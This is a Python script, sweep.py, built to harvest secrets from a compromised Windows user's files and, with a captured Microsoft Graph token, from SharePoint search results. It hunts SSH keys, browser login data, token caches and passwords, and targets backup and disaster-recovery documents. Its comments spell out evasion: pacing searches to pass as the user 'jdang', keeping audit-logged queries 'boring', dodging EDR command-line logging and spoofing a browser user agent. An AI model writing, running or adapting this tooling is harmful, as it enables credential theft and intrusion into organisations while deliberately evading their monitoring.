#!/usr/bin/env python3
"""sweep.py - low-and-slow, user-context secrets enumerator.

Two modes:

  LOCAL (default): enumerates files on disk for secrets.
      pythonw.exe sweep.py [outfile] [root1 [root2 ...]]

  SHAREPOINT (--sp): queries the Microsoft 365 search index (Graph Search
      API) as the signed-in user for secret-ish documents, then downloads
      and content-scans the small text ones. Only search queries + item
      downloads - no library crawling.
      pythonw.exe sweep.py --sp <tokenfile> [outfile]
      (token file = plain text file holding one Graph access token;
       never pass tokens on the command line - EDRs log command lines)

Behavior profile by design:
  - local mode: file enumeration + reads ONLY; no network, no registry,
    no child processes; paced IO; skips OneDrive placeholders
  - sp mode: human-paced queries (jdang searches SharePoint all day);
    fixed browser UA; small page sizes; capped downloads
"""
import datetime
import json
import os
import random
import re
import sys
import time
import urllib.error
import urllib.request

MAX_DEPTH = 14
CONTENT_MAXSZ = 2_000_000        # don't scan files bigger than 2 MB
CONTENT_READSZ = 1_000_000       # read at most 1 MB
PACE_EVERY = 32                  # files between sleeps
PACE_SEC = 0.010
SNIP_LEN = 180
MAX_HITS_PER_FILE = 6

ATTR_REPARSE = 0x00000400
ATTR_OFFLINE = 0x00001000
ATTR_RECALL_OPEN = 0x00040000
ATTR_RECALL_DATA = 0x00400000

NAME_NEEDLES = (
    "postman", "credential", "password", "passwd", "secret", "token",
    "id_rsa", "id_dsa", "id_ecdsa", ".kdbx", "sitemanager", "winscp.ini",
    "confcons.xml", "consolehost_history", "accesstokens", "msal_token_cache",
    ".git-credentials", ".netrc", "unattend.xml", "web.config", "sftp.json",
    "oauth", "client_secret", ".htpasswd", "login data", "local state",
    ".ovpn", ".ppk", "known_hosts", "filezilla", "mremote", "keepass",
    ".aws", ".kube", ".docker", "vault", "kubeconfig", "backup",
    "commvault", "veeam", "runbook", "recovery", "disaster", "dr-plan",
    "warehouse", "snowflake", "databricks", "synapse",
)

NAME_EXTS = (".pfx", ".p12", ".key", ".pem", ".rdp", ".env")

DIR_DENY = frozenset((
    "node_modules", ".git", "__pycache__", "cache", "cacheddata",
    "gpucache", "code cache", "cache_storage", "service worker",
    "temp", "tmp", "$recycle.bin", ".vs", "packages",
))

CONTENT_EXTS = (
    ".txt", ".json", ".env", ".config", ".xml", ".ini", ".yml", ".yaml",
    ".ps1", ".cmd", ".bat", ".py", ".cs", ".rdp", ".properties",
    ".conf", ".cfg", ".log", ".csv", ".js", ".vbs", ".sql", ".sh",
)

CONTENT_NEEDLES = (
    "client_secret", "password", "passwd", "pwd=", "api_key", "apikey",
    "api-key", "authorization: bearer", "accountkey=", "sharedaccesssignature",
    "connectionstring", "defaultendpointsprotocol", "hooks.slack.com",
    "x-api-key", "refresh_token", "access_token", "-----begin",
    "secret_key", "secretkey", "private_key", "mongodb://", "postgres://",
    "mysql://", "amqp://", "redis://",
)

RE_JWT = re.compile(rb"eyJ[A-Za-z0-9_-]{10,}\.eyJ")
RE_AKIA = re.compile(rb"\bAKIA[A-Z0-9]{16}\b")

# ---- SharePoint mode tuning ----------------------------------------
# jdang legitimately searches SharePoint through the day; this cadence is
# meant to read as a human, not a script. Note: M365 unified audit log can
# record search queries (SearchQueryPerformed) - keep the terms boring.
#
# Two lanes:
#  - secrets: phrase-precision KQL, near-zero noise; small text hits get
#    downloaded and content-scanned
#  - discovery: backup-infra docs we WANT to read by hand; listed only,
#    never downloaded (does not eat the download budget)
SP_SECRET_QUERIES = (
    # NOTE: SharePoint tokenizes on underscores/punctuation - phrase queries
    # must use spaces ("client secret" matches "client_secret" in content).
    # filetype:/extension: KQL is unreliable via Graph driveItem search - avoid.
    '"client secret"', '"client id"', '"refresh token"', '"api key"',
    '"access key"', '"sas token"', '"connection string"', '"private key"',
    "AccountKey", "DefaultEndpointsProtocol", "SharedAccessSignature",
    "password", "credentials", "postman", "pfx",
)
SP_DISCOVERY_QUERIES = (
    "commvault", "veeam", '"backup runbook"', '"disaster recovery"',
    '"backup infrastructure"', '"recovery vault"', '"backup admin"',
    '"data warehouse"', "synapse", "snowflake", "databricks", '"data lake"',
)
SP_DELAY_S = (15.0, 45.0)        # between queries
SP_PAGE_DELAY_S = (5.0, 10.0)    # between pages of one query
SP_DL_DELAY_S = (2.0, 6.0)       # between file downloads
SP_PAGES_PER_QUERY = 2
SP_PAGE_SIZE = 25
SP_MAX_DOWNLOADS = 40
SP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0")

counters = {"files": 0, "dirs": 0, "scanned": 0, "name": 0, "content": 0, "ph": 0,
            "sp_queries": 0, "sp_hits": 0, "sp_downloads": 0}

# ---- shared content scanning ----------------------------------------


def snippet(raw, off):
    start = max(0, off - 80)
    nl = raw.rfind(b"\n", start, off)
    if nl != -1:
        start = nl + 1
    end = raw.find(b"\n", off, off + SNIP_LEN)
    if end == -1:
        end = min(len(raw), off + SNIP_LEN)
    text = raw[start:end].decode("utf-8", "replace")
    return "".join(c if 32 <= ord(c) < 127 else "." for c in text)


def line_no(raw, off):
    return raw.count(b"\n", 0, off) + 1


def report(out, kind, label, detail=None):
    line = "[%s] %s" % (kind, label)
    if detail:
        line += " | " + detail
    out.write(line + "\n")
    out.flush()
    vlog(line)


def vlog(msg):
    # console progress; pythonw.exe has no stderr, so guard
    if sys.stderr:
        sys.stderr.write("# %s\n" % msg)
        sys.stderr.flush()


def scan_bytes(out, label, lowername, raw):
    hits = 0
    low = raw.lower()
    for needle in CONTENT_NEEDLES:
        nb = needle.encode()
        pos = 0
        while hits < MAX_HITS_PER_FILE:
            pos = low.find(nb, pos)
            if pos == -1:
                break
            report(out, "CONTENT", label,
                   "needle=%s line=%d :: %s" % (needle, line_no(raw, pos), snippet(raw, pos)))
            counters["content"] += 1
            hits += 1
            pos += len(nb)
        if hits >= MAX_HITS_PER_FILE:
            break
    for tag, rex in (("JWT", RE_JWT), ("AWS-KEY-ID", RE_AKIA)):
        if hits >= MAX_HITS_PER_FILE:
            break
        m = rex.search(raw)
        if m:
            report(out, "CONTENT", label, "pattern=%s line=%d" % (tag, line_no(raw, m.start())))
            counters["content"] += 1
            hits += 1


# ---- local filesystem mode ------------------------------------------


def lp(path):
    p = os.path.abspath(path)
    return p if p.startswith("\\\\?\\") else "\\\\?\\" + p


def strip_lp(path):
    return path[4:] if path.startswith("\\\\?\\") else path


def scan_local_file(out, path, lowername, size):
    if size == 0 or size > CONTENT_MAXSZ or not lowername.endswith(CONTENT_EXTS):
        return
    try:
        with open(path, "rb") as fh:
            raw = fh.read(CONTENT_READSZ)
    except OSError:
        return
    if not raw:
        return
    counters["scanned"] += 1
    scan_bytes(out, strip_lp(path), lowername, raw)


def walk(out, root, depth):
    if depth > MAX_DEPTH:
        return
    try:
        entries = list(os.scandir(root))
    except OSError:
        return
    for entry in entries:
        try:
            if entry.is_dir(follow_symlinks=False):
                attrs = entry.stat(follow_symlinks=False).st_file_attributes
                if attrs & ATTR_REPARSE:
                    continue                      # junctions / OneDrive dirs
                name = entry.name.lower()
                if name in DIR_DENY:
                    continue
                counters["dirs"] += 1
                if any(n in name for n in NAME_NEEDLES):
                    report(out, "DIR", strip_lp(entry.path))
                    counters["name"] += 1
                walk(out, entry.path, depth + 1)
            elif entry.is_file(follow_symlinks=False):
                attrs = entry.stat(follow_symlinks=False).st_file_attributes
                if attrs & (ATTR_OFFLINE | ATTR_RECALL_OPEN | ATTR_RECALL_DATA):
                    counters["ph"] += 1           # placeholder: reading it would hydrate
                    continue
                counters["files"] += 1
                name = entry.name.lower()
                size = entry.stat(follow_symlinks=False).st_size
                if any(n in name for n in NAME_NEEDLES) or name.endswith(NAME_EXTS):
                    report(out, "NAME", strip_lp(entry.path), "size=%d" % size)
                    counters["name"] += 1
                scan_local_file(out, entry.path, name, size)
                if counters["files"] % PACE_EVERY == 0:
                    time.sleep(PACE_SEC)
        except OSError:
            continue


def default_roots():
    roots = []
    up = os.environ.get("USERPROFILE")
    pub = os.environ.get("PUBLIC", r"C:\Users\Public")
    if up:
        roots.append(up)
    if pub:
        roots.append(pub)
    od = os.environ.get("OneDriveCommercial") or os.environ.get("OneDrive")
    if od and up and not os.path.abspath(od).lower().startswith(os.path.abspath(up).lower()):
        roots.append(od)
    return roots


# ---- SharePoint mode -------------------------------------------------


def sp_call(token, url, payload=None):
    headers = {"Authorization": "Bearer " + token, "User-Agent": SP_UA}
    data = None
    if payload is not None:
        data = json.dumps(payload).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers,
                                 method="POST" if data else "GET")
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.read()


def sp_search(token, query, frm):
    body = {"requests": [{
        "entityTypes": ["driveItem"],
        "query": {"queryString": query},
        "from": frm,
        "size": SP_PAGE_SIZE,
        "fields": ["name", "webUrl", "size", "fileType", "lastModifiedDateTime"],
    }]}
    raw = sp_call(token, "https://graph.microsoft.com/v1.0/search/query", body)
    doc = json.loads(raw.decode("utf-8", "replace"))
    hits, more = [], False
    for value in doc.get("value", []):
        for container in value.get("hitsContainers", []):
            more = more or bool(container.get("moreResultsAvailable"))
            for hit in container.get("hits", []):
                res = hit.get("resource", {})
                if res:
                    hits.append(res)
    return hits, more


def sp_download(token, drive_id, item_id):
    url = "https://graph.microsoft.com/v1.0/drives/%s/items/%s/content" % (drive_id, item_id)
    # Graph answers with a 302 to a pre-authenticated SharePoint URL;
    # urllib follows it (token header rides to *.sharepoint.com, MS-owned).
    return sp_call(token, url)


def sp_run(out, token):
    seen = set()
    downloads = 0
    lanes = ((SP_SECRET_QUERIES, True), (SP_DISCOVERY_QUERIES, False))
    total_queries = len(SP_SECRET_QUERIES) + len(SP_DISCOVERY_QUERIES)
    first = True
    for queries, allow_download in lanes:
        for query in queries:
            if not first:
                pause = random.uniform(*SP_DELAY_S)
                vlog("pause %.0fs" % pause)
                time.sleep(pause)
            first = False
            counters["sp_queries"] += 1
            vlog("query %d/%d: %s" % (counters["sp_queries"], total_queries, query))
            try:
                frm = 0
                for page in range(SP_PAGES_PER_QUERY):
                    if page:
                        time.sleep(random.uniform(*SP_PAGE_DELAY_S))
                    hits, more = sp_search(token, query, frm)
                    for res in hits:
                        key = (res.get("parentReference", {}).get("driveId"), res.get("id"))
                        url = res.get("webUrl", "")
                        if (key[0], key[1]) in seen or (not key[1] and url in seen):
                            continue
                        seen.add(key if key[1] else url)
                        counters["sp_hits"] += 1
                        name = res.get("name", "?")
                        size = res.get("size", 0) or 0
                        lane = "SP-HIT" if allow_download else "SP-DOC"
                        report(out, lane, url,
                               "query=%r name=%r size=%d modified=%s"
                               % (query, name, size, res.get("lastModifiedDateTime", "?")))
                        lowername = name.lower()
                        if (allow_download and downloads < SP_MAX_DOWNLOADS and key[0] and key[1]
                                and 0 < size <= CONTENT_MAXSZ
                                and lowername.endswith(CONTENT_EXTS)):
                            time.sleep(random.uniform(*SP_DL_DELAY_S))
                            try:
                                content = sp_download(token, key[0], key[1])
                            except Exception as exc:
                                report(out, "SP-ERR", url, "download failed: %s" % exc)
                                continue
                            downloads += 1
                            counters["sp_downloads"] += 1
                            scan_bytes(out, url, lowername, content[:CONTENT_READSZ])
                    if not more:
                        break
                    frm += SP_PAGE_SIZE
            except urllib.error.HTTPError as exc:
                body = exc.read().decode("utf-8", "replace")[:300]
                report(out, "SP-ERR", "query=%r" % query,
                       "HTTP %d: %s" % (exc.code, body))
                if exc.code in (401, 403):
                    report(out, "SP-ERR", "aborting: token rejected or insufficient scope")
                    return
            except Exception as exc:
                report(out, "SP-ERR", "query=%r" % query, "%s" % exc)


# ---- entry ------------------------------------------------------------


def main():
    args = sys.argv[1:]
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")

    if args and args[0] == "--sp":
        if len(args) < 2:
            sys.stderr.write("usage: sweep.py --sp <tokenfile> [outfile]\n")
            return 2
        with open(args[1], "r", encoding="ascii", errors="ignore") as fh:
            token = fh.read().strip()
        outpath = args[2] if len(args) > 2 else os.path.join(script_dir, "sweep-sp-%s.txt" % ts)
        with open(outpath, "w", encoding="utf-8", errors="replace") as out:
            out.write("# sweep SP mode start | host=%s user=%s\n"
                      % (os.environ.get("COMPUTERNAME", "?"), os.environ.get("USERNAME", "?")))
            sp_run(out, token)
            out.write("# complete | queries=%(sp_queries)d hits=%(sp_hits)d "
                      "downloads=%(sp_downloads)d content_hits=%(content)d\n" % counters)
        return 0

    if args:
        outpath, roots = args[0], args[1:]
    else:
        outpath = os.path.join(script_dir, "sweep-%s.txt" % ts)
        roots = default_roots()
    if not roots:
        roots = default_roots()
    with open(outpath, "w", encoding="utf-8", errors="replace") as out:
        out.write("# sweep start | host=%s user=%s\n"
                  % (os.environ.get("COMPUTERNAME", "?"), os.environ.get("USERNAME", "?")))
        for root in roots:
            out.write("# root: %s\n" % root)
            out.flush()
            walk(out, lp(root), 0)
        out.write("# complete | files=%(files)d dirs=%(dirs)d scanned=%(scanned)d "
                  "name_hits=%(name)d content_hits=%(content)d placeholders_skipped=%(ph)d\n"
                  % counters)
    return 0


if __name__ == "__main__":
    sys.exit(main())
